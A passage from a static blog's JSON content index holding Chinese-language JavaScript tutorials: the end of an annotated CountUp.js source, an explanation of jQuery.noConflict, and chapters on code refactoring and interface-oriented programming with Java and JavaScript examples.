self.endVal : self.frameVal; &#125; else &#123; self.frameVal = (self.frameVal &gt; self.endVal) ? self.endVal : self.frameVal; &#125; // decimal 由于计算时会产生小数误差，此处作用为消除误差：小数-》整数-》小数 self.frameVal = Math.round(self.frameVal*self.dec)/self.dec; // format and print value 打印值 self.printValue(self.frameVal); // whether to continue 动画没结束，则递归调用自身，用requestAnimationFrame代替setTimeout if (progress &lt; self.duration) &#123; self.rAF = requestAnimationFrame(self.count); // 每次执行将定时器保存下来，主要用于在reset方法中提前取消动画 &#125; else &#123; // 若动画结束，则调用回调函数 if (self.callback) self.callback(); &#125; &#125;; // start your animation 开始执行动画方法 // 同时注意，回调函数不是在配置中指定的，而是在start方法中指定 self.start = function(callback) &#123; if (!self.initialize()) return; // 检查是否初始化，防止初始化前就调用此实例方法 self.callback = callback; self.rAF = requestAnimationFrame(self.count); &#125;; // toggles pause/resume animation 支持暂停和恢复方法，通过内部的paused标志检查状态 // 但暂停仅仅只是取消了定时器，并没有重置已经完成的动画进度 self.pauseResume = function() &#123; if (!self.paused) &#123; // 粘贴动画 self.paused = true; cancelAnimationFrame(self.rAF); &#125; else &#123; // 恢复动画时，将剩余时间设置为持续时间，同时将当前的帧值保存为开始时间 self.paused = false; delete self.startTime; self.duration = self.remaining; self.startVal = self.frameVal; requestAnimationFrame(self.count); &#125; &#125;; // reset to startVal so animation can be run again 重置动画 // 与暂停动画方法相比，重置方法将开始时间删除，同时重置初始化标识 self.reset = function() &#123; self.paused = false; delete self.startTime; self.initialized = false; if (self.initialize()) &#123; // 接着直接开始新一轮动画 cancelAnimationFrame(self.rAF); self.printValue(self.startVal); &#125; &#125;; // pass a new endVal and start animation 在动画未结束前调用时可以动态更新结束值 self.update = function (newEndVal) &#123; if (!self.initialize()) return; // 若未初始化则直接返回 newEndVal = Number(newEndVal); if (!ensureNumber(newEndVal)) &#123; self.error = '[CountUp] update() - new endVal is not a number: '+newEndVal; return; &#125; self.error = ''; if (newEndVal === self.frameVal) return; // 若更新的值为当前帧的值，则直接返回 cancelAnimationFrame(self.rAF); // 每次更新值则需重置内部的属性，此时流程与暂停后立即恢复的操作类似，但不完全一致 self.paused = false; delete self.startTime; self.startVal = self.frameVal; self.endVal = newEndVal; self.countDown = (self.startVal &gt; self.endVal); self.rAF = requestAnimationFrame(self.count); &#125;; // format startVal on initialization if (self.initialize()) self.printValue(self.startVal);&#125;;return CountUp;&#125;));","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"countup","slug":"countup","permalink":"https://github.com/xmoyKING/tags/countup/"}]},{"title":"jquery.noConflict无冲突函数原理","slug":"jquery-noconflict","date":"2017-12-09T15:08:08.000Z","updated":"2017-12-10T02:57:26.699Z","comments":true,"path":"2017/12/09/jquery-noconflict/","link":"","permalink":"https://github.com/xmoyKING/2017/12/09/jquery-noconflict/","excerpt":"","text":"无冲突处理也称为多库共存。许多框架都爱用$作为自己的命名空间。jQuery发明了noConflict函数，能解决多库共存问题。 关于noConflict方法的使用，可以参考三分钟玩转jQuery.noConflict() 关键就是要理解，在页面加载jquery时，jquery自执行初始化对页面中的jQuery和$进行了缓存，无论这两个变量是否已经被占用，在使用noConflict方法后，都可以选择将其释放回缓存的内容。其实noConflict的布尔参数控制着是否释放jQuery变量，而$一定会被释放。 使用示例：12345678910111213141516&lt;!-- jQuery and $ are undefined --&gt;&lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js\"&gt;&lt;/script&gt;&lt;!-- jQuery and $ now point to jQuery 1.10.2 --&gt;&lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js\"&gt;&lt;/script&gt;&lt;!-- jQuery and $ now point to jQuery 1.7.0 --&gt;&lt;script&gt;jQuery.noConflict();&lt;/script&gt;&lt;!-- jQuery still points to jQuery 1.7.0; $ now points to jQuery 1.10.2 --&gt;&lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js\"&gt;&lt;/script&gt;&lt;!-- jQuery and $ now point to jQuery 1.6.4 --&gt;&lt;script&gt;var jquery164 = jQuery.noConflict( true );&lt;/script&gt;&lt;!-- jQuery now points to jQuery 1.7.0; $ now points to jQuery 1.10.2; jquery164 points to jQuery 1.6.4 --&gt; 源码解析：123456789101112131415161718192021222324252627282930var window = this, undefined, _jQuery = window.jQuery, _$ = window.$, //把window存入闭包中的同名变量，方便内部函数在调用window时不用费大力气查找它 //_jQuery与_$用于以后重写 jQuery = window.jQuery = window.$ = function(selector, context) &#123; //用于返回一个jQuery对象 return new jQuery.fn.init(selector, context);&#125;jQuery.extend(&#123; noConflict: function(deep) &#123; //引入jQuery类库后，闭包外面的window.$与window.jQuery都储存着一个函数 //它是用来生成jQuery对象或在domReady后执行其中的函数 //回顾最上面的代码，在还没有把function赋给它们时，_jQuery与_$已经被赋值了 //因此它们俩的值必然是undefined //因此这种放弃控制权的技术很简单，就是用undefined把window.$里面的jQuery系的函数清除 //这时Prototype或mootools的$就可以了 window.$ = _$;//相当于window.$ = undefined //这时就要为noConflict添加一个布尔值，为true if (deep) //但我们必须使用一个接纳jQuery对象与jQuery的入口函数 //闭包里面的内容除非被window等宿主对象引用，否则就是不可见的 //因此我们把闭包里面的jQuery return出去，外面用一个变量接纳就可以 window.jQuery = _jQuery;//相当window.jQuery = undefined return jQuery; &#125;&#125;);","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"jquery","slug":"jquery","permalink":"https://github.com/xmoyKING/tags/jquery/"},{"name":"noConflict","slug":"noConflict","permalink":"https://github.com/xmoyKING/tags/noConflict/"}]},{"title":"JS设计模式-19-代码重构","slug":"js-pattern19","date":"2017-12-07T06:52:14.000Z","updated":"2017-12-07T06:52:14.000Z","comments":true,"path":"2017/12/07/js-pattern19/","link":"","permalink":"https://github.com/xmoyKING/2017/12/07/js-pattern19/","excerpt":"","text":"到目前为止，实际上一直在不停地进行代码级别上的优化。在讲设计模式的章节中，我们总是先写一段反例代码，而后再介绍一段通过设计模式重构之后的更好的代码。这种强烈的对比会加深我们对该模式的理解。 模式和重构之间有着一种与生俱来的关系。从某种角度来看，设计模式的目的就是为许多重构行为提供目标。 在实际的项目开发中，除了使用设计模式进行重构之外，还有一些常见而容易忽略的细节，这些细节也是帮助我们达到重构目标的重要手段。一部分思想来自MartinFowler的名著《重构：改善既有代码的设计》，虽然该书是使用Java语言写成的，但这些重构的技巧，有很大一部分可以为JavaScript语言所借鉴。 虽然会提出一些重构的目标和手段，但它们都是建议，没有哪些是必须严格遵守的标准。具体是否需要重构，以及如何进行重构，这需要我们根据系统的类型、项目工期、人力等外界因素一起决定。 提炼函数在JavaScript开发中，我们大部分时间都在与函数打交道，所以我们希望这些函数有着良好的命名，函数体内包含的逻辑清晰明了。如果一个函数过长，不得不加上若干注释才能让这个函数显得易读一些，那这些函数就很有必要进行重构。如果在函数中有一段代码可以被独立出来，那我们最好把这些代码放进另外一个独立的函数中。这是一种很常见的优化工作，这样做的好处主要有以下几点。 避免出现超大函数。 独立出来的函数有助于代码复用。 独立出来的函数更容易被覆写。 独立出来的函数如果拥有一个良好的命名，它本身就起到了注释的作用。 比如在一个负责取得用户信息的函数里面，我们还需要打印跟用户信息有关的log，那么打印log的语句就可以被封装在一个独立的函数里：1234567var getUserInfo = function() &#123; ajax('userInfo', function(data) &#123; console.log('userId: ' + data.userId); console.log('userName: ' + data.userName); console.log('nickName: ' + data.nickName); &#125;);&#125;; 改为：12345678910var getUserInfo = function() &#123; ajax('userInfo', function(data) &#123; printDetails(data); &#125;);&#125;;var printDetails = function(data) &#123; console.log('userId: ' + data.userId); console.log('userName: ' + data.userName); console.log('nickName: ' + data.nickName);&#125;; 合并重复的条件片段如果一个函数体内有一些条件分支语句，而这些条件分支语句内部散布了一些重复的代码，那么就有必要进行合并去重工作。假如我们有一个分页函数paging，该函数接收一个参数currPage，currPage表示即将跳转的页码。在跳转之前，为防止currPage传入过小或者过大的数字，我们要手动对它的值进行修正，详见如下伪代码：1234567891011var paging = function(currPage) &#123; if (currPage &lt;= 0) &#123; currPage = 0; jump(currPage); // 跳 转 &#125; else if (currPage &gt;= totalPage) &#123; currPage = totalPage; jump(currPage); // 跳 转 &#125; else &#123; jump(currPage); // 跳 转 &#125;&#125;; 可以看到，负责跳转的代码jump(currPage)在每个条件分支内都出现了，所以完全可以把这句代码独立出来：12345678var paging = function(currPage) &#123; if (currPage &lt;= 0) &#123; currPage = 0; &#125; else if (currPage &gt;= totalPage) &#123; currPage = totalPage; &#125; jump(currPage); // 把 jump 函 数 独 立 出 来 &#125;; 把条件分支语句提炼成函数在程序设计中，复杂的条件分支语句是导致程序难以阅读和理解的重要原因，而且容易导致一个庞大的函数。假设现在有一个需求是编写一个计算商品价格的getPrice函数，商品的计算只有一个规则：如果当前正处于夏季，那么全部商品将以8折出售。代码如下：1234567var getPrice = function(price) &#123; var date = new Date(); if (date.getMonth() &gt;= 6 &amp;&amp; date.getMonth() &lt;= 9) &#123; // 夏 天 return price * 0.8; &#125; return price;&#125;; if ( date.getMonth() &gt;= 6 &amp;&amp; date.getMonth() &lt;= 9 ){ // ... }这句代码要表达的意思很简单，就是判断当前是否正处于夏天（7~10月）。尽管这句代码很短小，但代码表达的意图和代码自身还存在一些距离，阅读代码的人必须要多花一些精力才能明白它传达的意图。其实可以把这句代码提炼成一个单独的函数，既能更准确地表达代码的意思，函数名本身又能起到注释的作用。代码如下：12345678910var isSummer = function() &#123; var date = new Date(); return date.getMonth() &gt;= 6 &amp;&amp; date.getMonth() &lt;= 9;&#125;;var getPrice = function(price) &#123; if (isSummer()) &#123; // 夏 天 return price * 0.8; &#125; return price;&#125;; 合理使用循环在函数体内，如果有些代码实际上负责的是一些重复性的工作，那么合理利用循环不仅可以完成同样的功能，还可以使代码量更少。下面有一段创建XHR对象的代码，为了简化示例，只考虑版本9以下的IE浏览器，代码如下：1234567891011121314var createXHR = function() &#123; var xhr; try &#123; xhr = new ActiveXObject('MSXML2. XMLHttp. 6.0'); &#125; catch (e) &#123; try &#123; xhr = new ActiveXObject('MSXML2. XMLHttp. 3.0'); &#125; catch (e) &#123; xhr = new ActiveXObject('MSXML2. XMLHttp'); &#125; &#125; return xhr;&#125;;var xhr = createXHR(); 下面我们灵活地运用循环，可以得到跟上面代码一样的效果：123456789var createXHR = function() &#123; var versions = ['MSXML2. XMLHttp. 6.0ddd', 'MSXML2. XMLHttp. 3.0', 'MSXML2. XMLHttp']; for (var i = 0, version; version = versions[i++];) &#123; try &#123; return new ActiveXObject(version); &#125; catch (e) &#123;&#125; &#125;&#125;;var xhr = createXHR(); 提前让函数退出代替嵌套条件分支许多程序员都有这样一种观念：“每个函数只能有一个入口和一个出口。”现代编程语言都会限制函数只有一个入口。但关于“函数只有一个出口”，往往会有一些不同的看法。下面这段伪代码是遵守“函数只有一个出口的”的典型代码：1234567891011var del = function(obj) &#123; var ret; if (!obj.isReadOnly) &#123; // 不 为 只 读 的 才 能 被 删 除 if (obj.isFolder) &#123; // 如 果 是 文 件 夹 ret = deleteFolder(obj); &#125; else if (obj.isFile) &#123; // 如 果 是 文 件 ret = deleteFile(obj); &#125; &#125; return ret;&#125;; 嵌套的条件分支语句绝对是代码维护者的噩梦，对于阅读代码的人来说，嵌套的if、else语句相比平铺的if、else，在阅读和理解上更加困难，有时候一个外层if分支的左括号和右括号之间相隔500米之远。用《重构》里的话说，嵌套的条件分支往往是由一些深信“每个函数只能有一个出口的”程序员写出的。但实际上，如果对函数的剩余部分不感兴趣，那就应该立即退出。引导阅读者去看一些没有用的else片段，只会妨碍他们对程序的理解。 于是我们可以挑选一些条件分支，在进入这些条件分支之后，就立即让这个函数退出。要做到这一点，有一个常见的技巧，即在面对一个嵌套的if分支时，我们可以把外层if表达式进行反转。重构后的del函数如下：1234567891011var del = function(obj) &#123; if (obj.isReadOnly) &#123; // 反 转 if 表 达 式 return; &#125; if (obj.isFolder) &#123; return deleteFolder(obj); &#125; if (obj.isFile) &#123; return deleteFile(obj); &#125;&#125;; 传递对象参数代替过长的参数列表有时候一个函数有可能接收多个参数，而参数的数量越多，函数就越难理解和使用。使用该函数的人首先得搞明白全部参数的含义，在使用的时候，还要小心翼翼，以免少传了某个参数或者把两个参数搞反了位置。如果我们想在第3个参数和第4个参数之中增加一个新的参数，就会涉及许多代码的修改，代码如下：123456789var setUserInfo = function(id, name, address, sex, mobile, qq) &#123; console.log('id = ' + id); console.log('name = ' + name); console.log('address = ' + address); console.log('sex = ' + sex); console.log('mobile = ' + mobile); console.log('qq = ' + qq);&#125;;setUserInfo(1314, 'sven', 'shenzhen', 'male', '137********', 377876679); 这时我们可以把参数都放入一个对象内，然后把该对象传入setUserInfo函数，setUserInfo函数需要的数据可以自行从该对象里获取。现在不用再关心参数的数量和顺序，只要保证参数对应的key值不变就可以了：12345678910111213141516var setUserInfo = function(obj) &#123; console.log('id = ' + obj.id); console.log('name = ' + obj.name); console.log('address = ' + obj.address); console.log('sex = ' + obj.sex); console.log('mobile = ' + obj.mobile); console.log('qq = ' + obj.qq);&#125;;setUserInfo(&#123; id: 1314, name: 'sven', address: 'shenzhen', sex: 'male', mobile: '137********', qq: 377876679&#125;); 尽量减少参数数量如果调用一个函数时需要传入多个参数，那这个函数是让人望而生畏的，我们必须搞清楚这些参数代表的含义，必须小心翼翼地把它们按照顺序传入该函数。而如果一个函数不需要传入任何参数就可以使用，这种函数是深受人们喜爱的。在实际开发中，向函数传递参数不可避免，但我们应该尽量减少函数接收的参数数量。下面举个非常简单的示例。有一个画图函数draw，它现在只能绘制正方形，接收了3个参数，分别是图形的width、heigth以及square：1var draw = function( width, height, square )&#123;&#125;; 但实际上正方形的面积是可以通过width和height计算出来的，于是我们可以把参数square从draw函数中去掉：1var draw = function( width, height )&#123; var square = width * height; &#125;; 假设以后这个draw函数开始支持绘制圆形，我们需要把参数width和height换成半径radius，但图形的面积square始终不应该由客户传入，而是应该在draw函数内部，由传入的参数加上一定的规则计算得来。此时，我们可以使用策略模式，让draw函数成为一个支持绘制多种图形的函数。 少用三目运算符有一些程序员喜欢大规模地使用三目运算符，来代替传统的if、else。理由是三目运算符性能高，代码量少。不过，这两个理由其实都很难站得住脚。 即使我们假设三目运算符的效率真的比if、else高，这点差距也是完全可以忽略不计的。在实际的开发中，即使把一段代码循环一百万次，使用三目运算符和使用if、else的时间开销处在同一个级别里。 同样，相比损失的代码可读性和可维护性，三目运算符节省的代码量也可以忽略不计。让JS文件加载更快的办法有很多种，如压缩、缓存、使用CDN和分域名等。把注意力只放在使用三目运算符节省的字符数量上，无异于一个300斤重的人把超重的原因归罪于头皮屑。 如果条件分支逻辑简单且清晰，这无碍我们使用三目运算符：1var global = typeof window !== \"undefined\" ? window : this; 但如果条件分支逻辑非常复杂，如下段代码所示，那我们最好的选择还是按部就班地编写if、else。if、else语句的好处很多，一是阅读相对容易，二是修改的时候比修改三目运算符周围的代码更加方便：12345678if (!aup || !bup) &#123; return a === doc ? -1 : b === doc ? 1 : aup ? -1 : bup ? 1 : sortInput ? (indexOf.call(sortInput, a) - indexOf.call(sortInput, b)) : 0;&#125; 合理使用链式调用经常使用jQuery的程序员相当习惯链式调用方法，在JavaScript中，可以很容易地实现方法的链式调用，即让方法调用结束后返回对象自身，如下代码所示：123456789101112131415161718192021222324252627282930var User = function() &#123; this.id = null; this.name = null;&#125;;User.prototype.setId = function(id) &#123; this.id = id; return this;&#125;;User.prototype.setName = function(name) &#123; this.name = name; return this;&#125;;console.log(new User().setId(1314).setName('sven'));// 或var User = &#123; id: null, name: null, setId: function(id) &#123; this.id = id; return this; &#125;, setName: function(name) &#123; this.name = name; return this; &#125;&#125;;console.log(User.setId(1314).setName('sven')); 使用链式调用的方式并不会造成太多阅读上的困难，也确实能省下一些字符和中间变量，但节省下来的字符数量同样是微不足道的。链式调用带来的坏处就是在调试的时候非常不方便，如果我们知道一条链中有错误出现，必须得先把这条链拆开才能加上一些调试log或者增加断点，这样才能定位错误出现的地方。 如果该链条的结构相对稳定，后期不易发生修改，那么使用链式调用无可厚非。但如果该链条很容易发生变化，导致调试和维护困难，那么还是建议使用普通调用的形式：1234var user = new User(); user.setId( 1314 ); user.setName( 'sven' ); 分解大型类在作者编写的HTML5版“街头霸王”的第一版代码中，负责创建游戏人物的Spirit类非常庞大，不仅要负责创建人物精灵，还包括了人物的攻击、防御等动作方法，代码如下：12345678910111213var Spirit = function(name) &#123; this.name = name;&#125;;Spirit.prototype.attack = function(type) &#123; // 攻 击 if (type === 'waveBoxing') &#123; console.log(this.name + ': 使 用 波 动 拳'); &#125; else if (type === 'whirlKick') &#123; console.log(this.name + ': 使 用 旋 风 腿'); &#125;&#125;;var spirit = new Spirit('RYU');spirit.attack('waveBoxing'); // 输 出： RYU: 使 用 波 动 拳 spirit.attack('whirlKick'); // 输 出： RYU: 使 用 旋 风 腿 后来发现，Spirit.prototype.attack这个方法实现是太庞大了，实际上它完全有必要作为一个单独的类存在。面向对象设计鼓励将行为分布在合理数量的更小对象之中：1234567891011121314var Attack = function(spirit) &#123; this.spirit = spirit; &#125;;Attack.prototype.start = function(type) &#123; return this.list[type].call(this);&#125;;Attack.prototype.list = &#123; waveBoxing: function() &#123; console.log(this.spirit.name + ': 使 用 波 动 拳'); &#125;, whirlKick: function() &#123; console.log(this.spirit.name + ': 使 用 旋 风 腿'); &#125;&#125;; 现在的Spirit类变得精简了很多，不再包括各种各样的攻击方法，而是把攻击动作委托给Attack类的对象来执行，这段代码也是策略模式的运用之一：12345678910var Spirit = function(name) &#123; this.name = name; this.attackObj = new Attack(this); &#125;;Spirit.prototype.attack = function(type) &#123; // 攻 击 this.attackObj.start(type);&#125;;var spirit = new Spirit('RYU');spirit.attack('waveBoxing'); // 输 出： RYU: 使 用 波 动 拳 spirit.attack('whirlKick'); // 输 出： RYU: 使 用 旋 风 腿 用return退出多重循环假设在函数体内有一个两重循环语句，我们需要在内层循环中判断，当达到某个临界条件时退出外层的循环。我们大多数时候会引入一个控制标记变量：1234567891011121314var func = function() &#123; var flag = false; for (var i = 0; i &lt; 10; i++) &#123; for (var j = 0; j &lt; 10; j++) &#123; if (i * j &gt; 30) &#123; flag = true; break; &#125; &#125; if (flag === true) &#123; break; &#125; &#125; &#125;; 第二种做法是设置循环标记：123456789var func = function() &#123; outerloop: for (var i = 0; i &lt; 10; i++) &#123; innerloop: for (var j = 0; j &lt; 10; j++) &#123; if (i * j &gt; 30) &#123; break outerloop; &#125; &#125; &#125;&#125;; 这两种做法无疑都让人头晕目眩，更简单的做法是在需要中止循环的时候直接退出整个方法：123456789var func = function() &#123; for (var i = 0; i &lt; 10; i++) &#123; for (var j = 0; j &lt; 10; j++) &#123; if (i * j &gt; 30) &#123; return; &#125; &#125; &#125;&#125;; 当然用return直接退出方法会带来一个问题，如果在循环之后还有一些将被执行的代码呢？如果我们提前退出了整个方法，这些代码就得不到被执行的机会：12345678910var func = function() &#123; for (var i = 0; i &lt; 10; i++) &#123; for (var j = 0; j &lt; 10; j++) &#123; if (i * j &gt; 30) &#123; return; &#125; &#125; &#125; console.log( i ); // 这 句 代 码 没 有 机 会 被 执 行&#125;; 为了解决这个问题，我们可以把循环后面的代码放到return后面，如果代码比较多，就应该把它们提炼成一个单独的函数：12345678910111213var print = function(i) &#123; console.log(i);&#125;;var func = function() &#123; for (var i = 0; i &lt; 10; i++) &#123; for (var j = 0; j &lt; 10; j++) &#123; if (i * j &gt; 30) &#123; return print(i); &#125; &#125; &#125;&#125;;func();","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-18-接口和面向接口编程","slug":"js-pattern18","date":"2017-12-07T01:59:31.000Z","updated":"2017-12-07T01:59:31.000Z","comments":true,"path":"2017/12/07/js-pattern18/","link":"","permalink":"https://github.com/xmoyKING/2017/12/07/js-pattern18/","excerpt":"","text":"当谈到接口的时候，通常会涉及以下几种含义。 我们经常说一个库或者模块对外提供了某某API接口。通过主动暴露的接口来通信，可以隐藏软件系统内部的工作细节。这也是我们最熟悉的第一种接口含义。 第二种接口是一些语言提供的关键字，比如Java的interface。interface关键字可以产生一个完全抽象的类。这个完全抽象的类用来表示一种契约，专门负责建立类与类之间的联系。 第三种接口即是我们谈论的“面向接口编程”中的接口，接口的含义在这里体现得更为抽象。用《设计模式》中的话说就是：接口是对象能响应的请求的集合。 主要讨论的是第二种和第三种接口。首先,本章的前半部分都是针对Java语言的讲解，这是因为JavaScript并没有从语言层面提供对抽象类（Abstractclass）或者接口（interface）的支持，我们有必要从一门提供了抽象类和接口的语言开始，逐步了解“面向接口编程”在面向对象程序设计中的作用。 回到Java的抽象类首先让回顾一下动物世界。目前我们有一个鸭子类Duck，还有一个让鸭子发出叫声的AnimalSound类，该类有一个makeSound方法，接收Duck类型的对象作为参数，这几个类一直合作得很愉快，代码如下：1234567891011121314151617public class Duck &#123; // 鸭 子 类 public void makeSound() &#123; System.out.println(\"嘎 嘎 嘎\"); &#125;&#125;public class AnimalSound &#123; public void makeSound(Duck duck) &#123; // (1) 只 接 受 Duck 类 型 的 参 数 duck.makeSound(); &#125;&#125;public class Test &#123; public static void main(String args[]) &#123; AnimalSound animalSound = new AnimalSound(); Duck duck = new Duck(); animalSound.makeSound(duck); // 输 出： 嘎 嘎 嘎 &#125;&#125; 目前已经可以顺利地让鸭子发出叫声。后来动物世界里又增加了一些鸡，现在我们想让鸡也叫唤起来，但发现这是一件不可能完成的事情，因为在上面这段代码的(1)处，即AnimalSound类的sound方法里，被规定只能接受Duck类型的对象作为参数：123456789101112public class Chicken &#123; // 鸡 类 public void makeSound() &#123; System.out.println(\"咯 咯 咯\"); &#125;&#125;public class Test &#123; public static void main(String args[]) &#123; AnimalSound animalSound = new AnimalSound(); Chicken chicken = new Chicken(); animalSound.makeSound(chicken); // 报 错， animalSound.makeSound 只 能 接 受 Duck 类 型 的 参 数 &#125;&#125; 在享受静态语言类型检查带来的安全性的同时，也失去了一些编写代码的自由。 静态类型语言通常设计为可以“向上转型”。当给一个类变量赋值时，这个变量的类型既可以使用这个类本身，也可以使用这个类的超类。就像看到天上有只麻雀，我们既可以说“一只麻雀在飞”，也可以说“一只鸟在飞”，甚至可以说成“一只动物在飞”。通过向上转型，对象的具体类型被隐藏在“超类型”身后。当对象类型之间的耦合关系被解除之后，这些对象才能在类型检查系统的监视下相互替换使用，这样才能看到对象的多态性。 所以如果想让鸡也叫唤起来，必须先把duck对象和chicken对象都向上转型为它们的超类型Animal类，进行向上转型的工具就是抽象类或者interface。 先创建一个Animal抽象类,然后让Duck类和Chicken类都继承自抽象类Animal：12345678910111213public abstract class Animal &#123; abstract void makeSound(); // 抽 象 方 法 &#125;public class Chicken extends Animal &#123; public void makeSound() &#123; System.out.println(\"咯 咯 咯\"); &#125;&#125;public class Duck extends Animal &#123; public void makeSound() &#123; System.out.println(\"嘎 嘎 嘎\"); &#125;&#125; 也可以把Animal定义为一个具体类而不是抽象类，但一般不这么做。Scott Meyers曾指出，只要有可能，不要从具体类继承。现在剩下的就是让AnimalSound类的makeSound方法接收Animal类型的参数，而不是具体的Duck类型或者Chicken类型：1234567891011121314public class AnimalSound &#123; public void makeSound(Animal animal) &#123; // 接 收 Animal 类 型 的 参 数， 而 非 Duck 类 型 或 Chicken 类 型 animal.makeSound(); &#125;&#125;public class Test &#123; public static void main(String args[]) &#123; AnimalSound animalSound = new AnimalSound(); Animal duck = new Duck(); // 向 上 转 型 Animal Chicken chicken = new Chicken(); // 向 上 转 型 animalSound.makeSound(duck); // 输 出： 嘎 嘎 嘎 animalSound.makeSound(chicken); // 输 出： 咯 咯 咯 &#125;&#125; 通过抽象类完成了一个体现对象多态性的例子。但重点并非讲解多态，而是在于说明抽象类。抽象类在这里主要有以下两个作用。 向上转型。让Duck对象和Chicken对象的类型都隐藏在Animal类型身后，隐藏对象的具体类型之后，duck对象和chicken对象才能被交换使用，这是让对象表现出多态性的必经之路。 建立一些契约。继承自抽象类的具体类都会继承抽象类里的abstract方法，并且要求覆写它们。这些契约在实际编程中非常重要，可以帮助我们编写可靠性更高的代码。比如在命令模式中，各个子命令类都必须实现execute方法，才能保证在调用command.execute的时候不会抛出异常。如果让子命令类OpenTvCommand继承自抽象类Command： 123456789abstract class Command &#123; public abstract void execute();&#125; public class OpenTvCommand extends Command &#123; public OpenTvCommand() &#123;&#125;; public void execute() &#123; System.out.println(\"打 开 电 视 机\"); &#125;&#125; 那么自然有编译器帮助我们检查和保证子命令类OpenTvCommand覆写了抽象类Command中的execute抽象方法。如果没有这样做，编译器会尽可能早地抛出错误来提醒正在编写这段代码的程序员。 总而言之，不关注对象的具体类型，而仅仅针对超类型中的“契约方法”来编写程序，可以产生可靠性高的程序，也可以极大地减少子系统实现之间的相互依赖关系，即：面向接口编程，而不是面向实现编程。 奇怪的是，抽象类跟接口又有什么关系呢？实际上这里的接口并不是指interface，而是一个抽象的概念。 从过程上来看，“面向接口编程”其实是“面向超类型编程”。当对象的具体类型被隐藏在超类型身后时，这些对象就可以相互替换使用，我们的关注点才能从对象的类型上转移到对象的行为上。“面向接口编程”也可以看成面向抽象编程，即针对超类型中的abstract方法编程，接口在这里被当成abstract方法中约定的契约行为。这些契约行为暴露了一个类或者对象能够做什么，但是不关心具体如何去做。 interface除了用抽象类来完成面向接口编程之外，使用interface也可以达到同样的效果。虽然很多人在实际使用中刻意区分抽象类和interface，但使用interface实际上也是继承的一种方式，叫作接口继承。 相对于单继承的抽象类，一个类可以实现多个interface。抽象类中除了abstract方法之外，还可以有一些供子类公用的具体方法。interface使抽象的概念更进一步，它产生一个完全抽象的类，不提供任何具体实现和方法体（Java8提供实现方法的interface），但允许该interface的创建者确定方法名、参数列表和返回类型，这相当于提供一些行为上的约定，但不关心该行为的具体实现过程。 interface同样可以用于向上转型，这也是让对象表现出多态性的一条途径，实现了同一个接口的两个类就可以被相互替换使用。 再回到用抽象类实现让鸭子和鸡发出叫声的故事。这个故事得以完美收场的关键是让抽象类Animal给duck和chicken进行向上转型。但此时也引入了一个限制，抽象类是基于单继承的，也就是说我们不可能让Duck和Chicken再继承自另一个家禽类。如果使用interface，可以仅仅针对发出叫声这个行为来编写程序，同时一个类也可以实现多个interface。 下面用interface来改写基于抽象类的代码。我们先定义Animal接口，所有实现了Animal接口的动物类都将拥有Animal接口中约定的行为：123456789101112131415161718192021222324252627public interface Animal &#123; abstract void makeSound();&#125;public class Duck implements Animal &#123; public void makeSound() &#123; // 重 写 Animal 接 口 的 makeSound 抽 象 方 法 System.out.println(\"嘎 嘎 嘎\"); &#125;&#125;public class Chicken implements Animal &#123; public void makeSound() &#123; // 重 写 Animal 接 口 的 makeSound 抽 象 方 法 System.out.println(\"咯 咯 咯\"); &#125;&#125;public class AnimalSound &#123; public void makeSound(Animal animal) &#123; animal.makeSound(); &#125;&#125;public class Test &#123; public static void main(String args[]) &#123; Animal duck = new Duck(); Animal chicken = new Chicken(); AnimalSound animalSound = new AnimalSound(); animalSound.makeSound(duck); // 输 出： 嘎 嘎 嘎 animalSound.makeSound(chicken); // 输 出： 咯 咯 咯 &#125;&#125; JavaScript语言是否需要抽象类和interface抽象类和interface的作用主要都是以下两点。 通过向上转型来隐藏对象的真正类型，以表现对象的多态性。 约定类与类之间的一些契约行为。 对于JavaScript而言，因为JavaScript是一门动态类型语言，类型本身在JavaScript中是一个相对模糊的概念。也就是说，不需要利用抽象类或者interface给对象进行“向上转型”。除了number、string、boolean等基本数据类型之外，其他的对象都可以被看成“天生”被“向上转型”成了Object类型：12var ary = new Array(); var date = new Date(); 如果JavaScript是一门静态类型语言，上面的代码也许可以理解为：12345Array ary = new Array(); Date date = new Date();// 或Object ary = new Array(); Object date = new Date(); 很少有人在JavaScript开发中去关心对象的真正类型。在动态类型语言中，对象的多态性是与生俱来的，但在另外一些静态类型语言中，对象类型之间的解耦非常重要，甚至有一些设计模式的主要目的就是专门隐藏对象的真正类型。 因为不需要进行向上转型，接口在JavaScript中的最大作用就退化到了检查代码的规范性。比如检查某个对象是否实现了某个方法，或者检查是否给函数传入了预期类型的参数。如果忽略了这两点，有可能会在代码中留下一些隐藏的bug。比如我们尝试执行obj对象的show方法，但是obj对象本身却没有实现这个方法，代码如下：1234567891011121314function show(obj) &#123; obj.show(); // Uncaught TypeError: undefined is not a function &#125;var myObject = &#123;&#125;; // myObject 对 象 没 有 show 方 法 show(myObject);// 或function show(obj) &#123; obj.show(); // TypeError: number is not a function &#125;var myObject = &#123; // myObject.show 不 是 Function 类 型 show: 1&#125;;show(myObject); 此时，我们不得不加上一些防御性代码：1234567891011121314151617function show(obj) &#123; if (obj &amp;&amp; typeof obj.show === 'function') &#123; obj.show(); &#125;&#125;// 或function show(obj) &#123; try &#123; obj.show(); &#125; catch (e) &#123;&#125;&#125;var myObject = &#123;&#125;; // myObject 对 象 没 有 show 方 法 // var myObject = &#123; // myObject.show 不 是 Function 类 型 // show: 1 // &#125;; show(myObject); 如果JavaScript有编译器帮我们检查代码的规范性，那事情要比现在美好得多，不用在业务代码中到处插入一些跟业务逻辑无关的防御性代码。作为一门解释执行的动态类型语言，把希望寄托在编译器上是不可能了。如果要处理这类异常情况，只有手动编写一些接口检查的代码。 